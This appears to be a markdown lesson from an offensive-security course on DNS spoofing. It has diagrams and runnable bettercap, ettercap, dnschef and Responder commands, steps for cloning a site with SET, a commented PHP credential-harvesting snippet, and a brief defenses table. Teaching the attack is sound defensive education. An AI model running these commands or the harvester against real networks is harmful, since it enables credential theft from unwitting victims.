# DNS Spoofing

## Unit 5 - Topic 2 | Man-in-the-Middle Attacks

---

## Overview

**DNS spoofing** (DNS cache poisoning) provides false DNS responses to redirect victims to attacker-controlled servers. Combined with ARP spoofing, it's a powerful technique to redirect web traffic, capture credentials, and serve malicious content.

---

## 1. How DNS Spoofing Works

```
NORMAL DNS RESOLUTION:
Victim → DNS Server: "What is login.bank.com?"
DNS Server → Victim: "login.bank.com = 203.0.113.50" ✅

DNS SPOOFING ATTACK:
                                    ┌──────────────┐
                                    │  Real Server  │
                                    │ 203.0.113.50  │
                                    └──────────────┘
                                          ↑ (never reached)

┌──────────┐   DNS Query    ┌──────────┐
│  Victim  │ ───────────→   │ Attacker │ (intercepts via ARP spoof)
│          │ ←───────────   │  (MitM)  │
└──────────┘   FAKE Reply   └──────────┘
               "login.bank.com        │
                = 10.0.0.50"          │
                                      ↓
                               ┌──────────────┐
                               │ Fake Server  │
                               │  10.0.0.50   │ (Attacker's phishing page)
                               └──────────────┘
```

---

## 2. DNS Spoofing Methods

```
METHOD 1: LOCAL DNS SPOOFING (ARP + DNS)
├── ARP spoof to intercept traffic
├── Intercept DNS queries
├── Reply with fake IP before real DNS
└── Victim connects to attacker's server

METHOD 2: DNS CACHE POISONING
├── Send forged responses to DNS server
├── Poison the server's cache
├── All clients using that server affected
└── Harder but wider impact

METHOD 3: ROGUE DNS SERVER
├── DHCP attack assigns attacker as DNS
├── Or compromise existing DNS server
├── Control all name resolution
└── Most persistent

METHOD 4: HOSTS FILE MODIFICATION
├── Edit victim's /etc/hosts or C:\Windows\System32\drivers\etc\hosts
├── Requires local access
├── Persistent until removed
└── Not technically "spoofing" but same effect
```

---

## 3. DNS Spoofing Tools

```bash
# === BETTERCAP (Best Modern Tool) ===
sudo bettercap -iface eth0

# Enable ARP spoofing first:
set arp.spoof.targets 192.168.1.10
arp.spoof on

# Enable DNS spoofing:
set dns.spoof.domains login.bank.com,mail.target.com
set dns.spoof.address 10.0.0.50
dns.spoof on

# Spoof ALL domains:
set dns.spoof.all true
dns.spoof on

# === ETTERCAP DNS SPOOFING ===
# Edit /etc/ettercap/etter.dns:
# login.bank.com  A  10.0.0.50
# *.target.com    A  10.0.0.50

# Run with DNS plugin:
ettercap -T -q -i eth0 -M arp:remote \
  -P dns_spoof /192.168.1.10// /192.168.1.1//

# === DNSCHEF (Standalone DNS Proxy) ===
dnschef --fakeip 10.0.0.50 --interface 0.0.0.0
# Responds to ALL DNS queries with fake IP

# Specific domains only:
dnschef --fakedomains login.bank.com,mail.target.com \
        --fakeip 10.0.0.50

# === RESPONDER (Windows Networks) ===
responder -I eth0 -wrd
# Responds to DNS queries on local network
# Captures NTLMv2 hashes from authentication
```

---

## 4. Setting Up Fake Services

```bash
# === AFTER DNS SPOOF — Serve fake content ===

# Simple HTTP phishing page:
python3 -m http.server 80
# Serve cloned login page from current directory

# SET (Social-Engineer Toolkit):
setoolkit
# Option 1: Social Engineering Attacks
# Option 2: Website Attack Vectors
# Option 3: Credential Harvester
# Option 2: Site Cloner
# Enter: https://login.bank.com

# === CAPTURE CREDENTIALS ===
# SET automatically captures submitted credentials
# Or use custom page with logging:

# Simple credential catcher (PHP):
# <?php
#   $user = $_POST['username'];
#   $pass = $_POST['password'];
#   file_put_contents("creds.txt", "$user:$pass\n", FILE_APPEND);
#   header("Location: https://real-login.bank.com");
# ?>
```

---

## 5. Detection and Prevention

| Defense | Description |
|---------|-------------|
| **DNSSEC** | Cryptographically signs DNS responses |
| **DNS over HTTPS (DoH)** | Encrypts DNS queries |
| **DNS over TLS (DoT)** | Encrypts DNS transport |
| **HSTS** | Forces HTTPS, prevents HTTP downgrade |
| **Certificate pinning** | App checks specific certificate |
| **DNS monitoring** | Alert on unusual DNS responses |
| **Split DNS** | Internal/external DNS separation |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **DNS spoofing** | Fake DNS responses redirect traffic |
| **Requires MitM** | Usually combined with ARP spoofing |
| **Bettercap** | Modern tool for ARP+DNS spoofing |
| **Responder** | Windows network DNS/LLMNR poisoning |
| **Fake services** | Serve phishing pages on redirected traffic |
| **Defense** | DNSSEC, DoH, HSTS, certificate validation |

---

## Quick Revision Questions

1. **How does DNS spoofing redirect victims?**
2. **Why is ARP spoofing usually required before DNS spoofing?**
3. **What is the difference between DNS spoofing and DNS cache poisoning?**
4. **How does DNSSEC prevent DNS spoofing?**
5. **What tool combines ARP spoofing and DNS spoofing?**

---

[← Previous: ARP Spoofing](01-arp-spoofing-poisoning.md) | [Next: DHCP Attacks →](03-dhcp-attacks.md)

---

*Unit 5 - Topic 2 of 6 | [Back to README](../README.md)*
